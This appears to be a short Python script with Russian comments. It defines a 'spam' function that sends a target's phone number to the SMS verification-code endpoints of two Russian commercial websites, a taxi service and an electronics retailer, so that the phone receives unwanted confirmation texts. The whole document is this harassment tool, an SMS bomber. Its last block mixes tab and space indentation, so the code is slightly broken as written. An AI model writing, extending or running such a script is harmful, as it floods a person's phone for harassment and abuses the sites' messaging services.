#Импортируем библиотеки
import requests
import time

#Для удобства создаем функцию
def spam(phone, phone9):
  
    #Поместим запрос в блок try, except, чтобы скрипт продолжил работать, если сервис выдаст ошибку
    try:
        requests.post("https://moscow.rutaxi.ru/ajax_keycode.html", data={"l": phone9}).json()["res"] #Создаем пост запрос на сервис
        print('Сообщение отправлено!') #В случае если код сработал, выведет это
    except:
        print('Сообщение не отправлено.') #В случае если код не сработал, выведет это

    time.sleep(1) #задержка перед вторым запросом длинной в 1 секунду (на деле это, конечно, не обязательно, но пусть будет)

    try:
        requests.post("https://www.citilink.ru/registration/confirm/phone/+" + phone + "/")
        print('Сообщение отправлено!')
    except:
			print('Сообщение не отправлено.')
